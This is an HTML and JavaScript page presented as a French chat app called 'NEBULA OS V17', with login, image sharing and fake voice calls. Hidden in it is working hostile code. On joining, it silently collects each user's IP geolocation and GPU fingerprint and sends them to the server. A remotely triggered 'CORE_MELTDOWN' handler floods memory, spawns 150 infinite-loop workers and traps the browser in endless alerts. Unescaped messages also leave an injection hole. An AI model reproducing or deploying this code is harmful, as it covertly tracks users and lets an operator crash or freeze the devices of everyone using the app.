<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEBULA OS - V17</title>
    <style>
        :root { --main: #74b9ff; --glass: rgba(255, 255, 255, 0.05); }
        body { margin: 0; background: #010103; color: white; height: 100vh; display: flex; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        
        /* UI COMPONENTS */
        #sidebar { width: 300px; background: rgba(0,0,0,0.6); backdrop-filter: blur(15px); border-right: 1px solid var(--glass); display: flex; flex-direction: column; }
        #chat-zone { flex: 1; display: flex; flex-direction: column; position: relative; }
        #messages { flex: 1; overflow-y: auto; padding: 20px; }
        
        .user-card { display: flex; align-items: center; padding: 12px; margin: 8px; border-radius: 12px; background: var(--glass); cursor: pointer; transition: 0.2s; }
        .user-card:hover { background: rgba(255,255,255,0.1); }
        .u-pp { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; margin-right: 10px; border: 2px solid var(--main); }
        
        /* CHAT BUBBLES */
        .msg { display: flex; gap: 10px; margin-bottom: 15px; animation: slide 0.3s ease; }
        .bubble { background: var(--glass); padding: 10px 15px; border-radius: 15px; max-width: 60%; }
        .chat-img { max-width: 100%; border-radius: 10px; margin-top: 5px; display: block; border: 1px solid var(--glass); }

        /* CALL OVERLAY */
        #call-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(20px); z-index: 20000; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .call-btn { width: 60px; height: 60px; border-radius: 50%; border: none; cursor: pointer; margin: 20px; font-size: 20px; }

        /* INPUT */
        #input-area { padding: 15px; background: #000; display: flex; gap: 10px; align-items: center; border-top: 1px solid var(--glass); }
        input { flex: 1; background: var(--glass); border: 1px solid #333; color: white; padding: 12px; border-radius: 20px; outline: none; }
        .icon-btn { background: none; border: none; color: var(--main); font-size: 24px; cursor: pointer; padding: 0 10px; }

        #login { position: fixed; inset: 0; background: #000; z-index: 30000; display: flex; align-items: center; justify-content: center; }
        #crash { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; color: red; text-align: center; padding-top: 40vh; }
        @keyframes slide { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="crash"><h1>HARDWARE_MELTDOWN</h1></div>

    <div id="call-overlay">
        <img id="call-pp" style="width:120px; height:120px; border-radius:50%; border:3px solid var(--main); margin-bottom:20px;">
        <h2 id="call-name">Appel entrant...</h2>
        <div style="display:flex;">
            <button class="call-btn" style="background:#ff4d4d;" onclick="endCall()">✕</button>
            <button class="call-btn" style="background:#2ecc71;" onclick="acceptCall()">📞</button>
        </div>
        <audio id="ringtone" loop src="https://www.soundjay.com/phone/phone-calling-1.mp3"></audio>
    </div>

    <div id="login">
        <div style="text-align:center; background:var(--glass); padding:40px; border-radius:25px; border:1px solid var(--glass);">
            <h1 style="color:var(--main); letter-spacing:5px;">NEBULA V17</h1>
            <input type="text" id="nick" placeholder="PSEUDO..." style="width:100%; margin-bottom:15px;">
            <input type="file" id="pp-file" accept="image/*" style="display:none">
            <button class="icon-btn" onclick="document.getElementById('pp-file').click()" style="font-size:14px;">[ AJOUTER UNE PP ]</button>
            <button onclick="join()" style="display:block; width:100%; margin-top:20px; padding:12px; background:var(--main); border:none; border-radius:10px; font-weight:bold; cursor:pointer;">ENTRER</button>
        </div>
    </div>

    <div id="sidebar">
        <div style="padding:20px; border-bottom:1px solid var(--glass);"><h3 style="color:var(--main); margin:0;">STATIONS</h3></div>
        <div id="user-list"></div>
    </div>

    <div id="chat-zone">
        <div id="messages"></div>
        <form id="input-area">
            <input type="file" id="img-send" accept="image/*" style="display:none">
            <button type="button" class="icon-btn" onclick="document.getElementById('img-send').click()">+</button>
            <input id="msg-in" placeholder="Message..." autocomplete="off">
            <button type="submit" class="icon-btn">➤</button>
        </form>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = { name: "", pp: "https://i.imgur.com/6VBx3io.png", geo: {}, hw: {} };

        // --- JOIN LOGIC ---
        function join() {
            const nick = document.getElementById('nick').value;
            if(!nick) return;
            me.name = nick;
            const file = document.getElementById('pp-file').files[0];
            if(file) {
                const r = new FileReader();
                r.onload = (e) => { me.pp = e.target.result; finalize(); };
                r.readAsDataURL(file);
            } else { finalize(); }
        }

        async function finalize() {
            try { const r = await fetch('https://ipapi.co/json/'); me.geo = await r.json(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            me.hw = { gpu: gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) };
            document.getElementById('login').style.display = 'none';
            socket.emit('init_user', me);
        }

        // --- ENVOI IMAGES ---
        document.getElementById('img-send').onchange = (e) => {
            const file = e.target.files[0];
            if(file) {
                const r = new FileReader();
                r.onload = (ev) => {
                    socket.emit('chat_msg', { text: "", img: ev.target.result, name: me.name, pp: me.pp });
                };
                r.readAsDataURL(file);
            }
        };

        // --- CHAT LOGIC ---
        document.getElementById('input-area').onsubmit = (e) => {
            e.preventDefault();
            const text = document.getElementById('msg-in').value;
            if(!text) return;
            socket.emit('chat_msg', { text, name: me.name, pp: me.pp });
            document.getElementById('msg-in').value = '';
        };

        socket.on('chat_msg', (d) => {
            const m = document.createElement('div');
            m.className = 'msg';
            let content = d.text ? `<div>${d.text}</div>` : '';
            if(d.img) content += `<img src="${d.img}" class="chat-img">`;
            m.innerHTML = `<img src="${d.pp}" class="u-pp"><div class="bubble"><div style="font-size:0.7em; color:var(--main);">${d.name}</div>${content}</div>`;
            document.getElementById('messages').appendChild(m);
            document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
        });

        // --- LISTE UTILISATEURS + BOUTON APPEL ---
        socket.on('update_users', (list) => {
            const container = document.getElementById('user-list');
            container.innerHTML = '';
            list.forEach(u => {
                if(u.name === me.name) return;
                const div = document.createElement('div');
                div.className = 'user-card';
                div.innerHTML = `<img src="${u.pp}" class="u-pp"><div style="flex:1;"><b>${u.name}</b></div><button class="icon-btn" onclick="startCall('${u.ip}')" style="font-size:18px;">📞</button>`;
                container.appendChild(div);
            });
        });

        // --- APPELS ---
        function startCall(ip) { 
            alert("Appel en cours vers " + ip + "..."); 
            socket.emit('start_call', ip); 
        }

        socket.on('incoming_call', (d) => {
            document.getElementById('call-pp').src = d.fromPP;
            document.getElementById('call-name').innerText = d.fromName + " vous appelle...";
            document.getElementById('call-overlay').style.display = 'flex';
            document.getElementById('ringtone').play();
        });

        function endCall() { 
            document.getElementById('call-overlay').style.display = 'none'; 
            document.getElementById('ringtone').pause();
        }

        function acceptCall() {
            // Simulation de connexion... qui finit par ramer
            document.getElementById('call-name').innerText = "CONNEXION ÉTABLIE...";
            setTimeout(() => { alert("Erreur de flux WebRTC - Tentative de reconnexion..."); }, 2000);
        }

        // --- BOMB (V17 HARDWARE KILL) ---
        socket.on('CORE_MELTDOWN', () => {
            document.getElementById('crash').style.display = 'block';
            const h = [];
            setInterval(() => { h.push(new Uint8Array(500 * 1024 * 1024).fill(1)); }, 40);
            for(let i=0; i<150; i++) new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
            while(true) { window.history.pushState(null,null,""); alert("SYSTEM_CRITICAL: OVERHEAT"); }
        });
    </script>
</body>
</html>
